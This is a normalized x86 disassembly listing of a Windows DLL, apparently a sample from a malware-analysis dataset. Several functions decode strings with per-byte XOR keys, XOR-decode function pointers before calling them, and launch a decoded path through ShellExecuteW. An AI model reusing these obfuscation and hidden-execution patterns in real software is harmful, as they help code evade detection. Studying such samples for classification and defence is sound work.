mov [ ebp - 0x16c ] edi
mov [ ebp - 0x170 ] ebx
mov [ ebp - 0x180 ] bl
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov eax [ ebp - 0x180 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1006591f
add esp 0x4
sub_100698a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ebx ebx
push edi
mov edi 0x1
cmp eax ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov eax [ esi + 0x90 ]
cmp eax ebx
je r-xdata
push ebx
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x4c ]
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp - 0x4 ] al
xor [ ebp - 0x3 ] al
xor [ ebp - 0x2 ] al
xor [ ebp - 0x1 ] al
push ecx
call [ ebp - 0x4 ]
mov [ esi + 0x4c ] ebx
mov eax edi
pop edi
mov [ esi + 0x94 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x90 ] ebx
sub_10069918
push 0x38
mov eax sub_1007f481
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1002b6c2
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1002c25c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_100699d0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_10014520
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_100699f2
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_1006a508
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
push [ esi + ebx * 4 + 0x1c ]
call sub_10079b60
push [ esi + ebx * 4 ]
mov [ ebp - 0x14 ] eax
call sub_10079b60
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_10079b60
push [ ebx ]
mov [ ebp - 0xc ] eax
call sub_10079b60
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax edi
dec [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_10079b60
push [ esi + 0x98 ]
mov ebx eax
call sub_10079b60
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_10079b60
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_10079b60
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_10079b60
lea eax [ edi + eax + 0x165 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_10008102
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x164
push esi
push ebx
lea edi [ ebx + 0x164 ]
call sub_100796a0
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
push edi
call sub_10079b60
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10079b60
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10079b60
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
push edi
call sub_10079b60
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
add [ ebp - 0x14 ] 0x4
cmp [ ebp - 0x4 ] 0xc
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x14 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
push edi
call sub_10079b60
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10079b60
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10079b60
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10079b60
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
sub_10069ce0
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ecx ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100014b7
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10050f50
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10069d50
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ rw-data ]
cmp edi [ rw-data ]
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0x10 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ edi ]
add ecx 0xc
cmp [ ebp - 0x8 ] 0x8
jb r-xdata
mov esi [ ecx + 0x10 ]
mov edx esi
cmp edx esi
jae r-xdata
mov eax [ eax ]
mov edx esi
cmp esi ebx
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ecx ]
cmp esi ebx
jb r-xdata
mov bx [ ecx ]
cmp bx [ eax ]
jne r-xdata
add edi 0x4
cmp edi [ rw-data ]
jne r-xdata
xor eax eax
cmp esi ebx
setne al
sbb eax eax
and eax 0xfffffffe
inc eax
je r-xdata
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ edi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
jmp r-xdata
test eax eax
je r-xdata
sub_10069df6
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004fd82
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
sub_10069e67
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_10069f30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_10069f30
mov esi [ esi ]
push edi
call sub_1006591f
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_10069f70
push ebp
mov ebp esp
sub esp 0x440
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor eax eax
push esi
lea ecx [ ecx ]
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x7b
and esi 0xff
mov [ ebp + eax * 2 - 0x30 ] si
inc eax
cmp eax 0x11
jb r-xdata
push edx
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x238 ]
mov [ ebp - 0xe ] ax
call sub_10041b00
mov ecx [ r--data ]
add esp 0x8
pop esi
xor eax eax
pop ebx
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8f
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
push 0x104
lea ecx [ ebp - 0x440 ]
push ecx
lea edx [ ebp - 0xc ]
xor eax eax
push edx
mov [ ebp - 0x6 ] ax
call [ GetEnvironmentVariableW@IAT ]
push 0x0
push 0x0
lea eax [ ebp - 0x238 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
push 0x0
push 0x0
call [ ShellExecuteW@IAT ]
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp eax 0x20
setg dl
xor ecx ebp
mov eax edx
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1006a03c
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10055691
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1006a0d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100149fd
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003c6eb
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1003fe0d
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_1006a1a0
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_1006591f
add esp 0x4
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
xor eax eax
mov [ esi + 0xc ] ax
pop esi
retn
mov edx [ esi + 0xc ]
push edx
call sub_1006591f
add esp 0x4
sub_1006a1f7
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_1006a280
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1006a2d0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push r--data
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
call sub_10002e10
lea eax [ ebp - 0x10 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
add esp 0x8
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call sub_10043190
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1006a337
push 0x38
mov eax sub_1007f89a
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10059065
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10069ce0
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10058a63
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_1006a410
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
mov [ esp + 0x18 ] ecx
mov ecx [ ebp + 0x10 ]
push esi
xor eax eax
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x18 ]
mov bl 0x38
push eax
mov [ esp + 0x2c ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x30 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_1006a508
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_10039c8c
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1004beba
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_100309f2
mov [ esi + 0x4 ] eax
sub_1006a590
push ebp
mov ebp esp
push 0xffffffff
push sub_10082cdf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4dc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ r--data ]
xor ebx ebx
xor eax eax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x61
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x3e ] ax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff9
and edx 0xff
mov [ ebp + eax * 2 - 0x70 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x69
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffa
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x52
and edx 0xff
mov [ ebp + eax * 2 - 0x9c ] dx
inc eax
cmp eax 0x15
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x72 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd2
and edx 0xff
mov [ ebp + eax * 2 - 0x198 ] dx
inc eax
cmp eax 0x5f
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xda ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff1
and edx 0xff
mov [ ebp + eax * 2 - 0xd8 ] dx
inc eax
cmp eax 0x1d
jb r-xdata
xor eax eax
push 0x2
lea esi [ ebp - 0x3f4 ]
mov [ ebp - 0x9e ] ax
call sub_10058280
add esp 0x4
mov edi eax
push 0xf
lea esi [ ebp - 0x42c ]
mov [ ebp - 0x4 ] ebx
call sub_10058280
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x448 ]
mov [ ebp - 0x4 ] 0x1
call sub_10030dc0
add esp 0x4
mov ecx eax
mov eax edi
lea edi [ ebp - 0x3bc ]
mov [ ebp - 0x4 ] 0x2
call sub_10044a40
mov edi 0x8
cmp [ ebp - 0x434 ] edi
jb r-xdata
mov esi 0x7
xor edx edx
mov [ ebp - 0x434 ] esi
mov [ ebp - 0x438 ] ebx
mov [ ebp - 0x448 ] dx
cmp [ ebp - 0x418 ] edi
jb r-xdata
mov ecx [ ebp - 0x448 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x418 ] esi
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x42c ] cx
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x3e0 ] edi
jb r-xdata
mov eax [ ebp - 0x42c ]
push eax
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x9c ]
xor eax eax
mov [ ebp - 0x3e0 ] esi
mov esi [ ebp - 0x3ac ]
push ecx
mov [ ebp - 0x3e4 ] ebx
mov [ ebp - 0x3f4 ] ax
call [ lstrlenW@IAT ]
lea ebx [ eax + esi + 0x1 ]
mov esi [ GetProcessHeap@IAT ]
lea edx [ ebx + ebx ]
push edx
push edi
call esi
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x4d0 ] edi
test edi edi
je r-xdata
mov edx [ ebp - 0x3f4 ]
push edx
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x3a8 ] 0x8
jb r-xdata
cmp [ ebp - 0x3a8 ] 0x8
mov eax [ ebp - 0x3bc ]
jae r-xdata
xor eax eax
mov eax [ ebp - 0x3bc ]
push eax
call sub_1006591f
add esp 0x4
jmp r-xdata
push eax
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx ebx
mov ebx edi
call sub_10041b00
add esp 0x8
push 0x144
xor ebx ebx
push ebx
call esi
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4d8 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x3bc ]
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
